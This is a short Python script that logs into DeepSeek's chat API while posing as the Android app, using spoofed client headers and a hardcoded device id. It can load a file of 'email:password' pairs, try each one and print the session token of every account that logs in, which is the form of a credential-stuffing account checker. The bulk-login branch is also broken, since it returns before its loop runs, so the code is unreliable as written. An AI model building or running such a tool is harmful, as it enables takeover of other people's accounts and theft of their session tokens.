import requests, json

def Login(email, password):
    url = "https://chat.deepseek.com/api/v0/users/login"
    headers = {
        'User-Agent': "DeepSeek/1.0.6 Android/34",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'x-client-platform': "android",
        'x-client-version': "1.0.6",
        'x-client-locale': "en_US",
        'x-rangers-id': "7885356159258217986",
        'accept-charset': "UTF-8"
    }

    payload = {
        "email": email,
        "password": password,
        "device_id": "BonexM7wSRdRdp7iK95kS8rdqdNdPlC+GYTOEIW5/AG35aGROhri+ZSCEB6PMDEN5wXpvnYTWDE+gvHJezDWLtQ==",
        "os": "android"
    }

    response = requests.post(url, data=json.dumps(payload), headers=headers)
    try:
        data = response.json()
        if "data" in data and "user" in data["data"] and "token" in data["data"]["user"]:
            token = data["data"]["user"]["token"]
            print(f"Successful login: {email} | Token: {token}")
        else:
            print(f"Login failed: {email}")
            #print(f"Error: {requests.text}")
    except json.JSONDecodeError:
        print(f"Error parsing server response for account: {email}")

def main():
    print("Select login method:")
    print("1. Manual input (email and password)")
    print("2. Login using email:password from a file")

    choice = input("Enter choice (1/2): ")

    if choice == "1":
        email = input("\nEnter your email: ")
        password = input("Enter your password: ")
        Login(email, password)
    elif choice == "2":
        file_path = input("Enter the file path with email:password list: ")
        try:
          with open(file_path, 'r') as f:
            lines = f.readlines()
            credentials = [line.strip().split(":") for line in lines]
            return credentials
        except FileNotFoundError:
            print("File not found.")
            return []
        if credentials:
            for email, password in credentials:
                Login(email, password)
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()
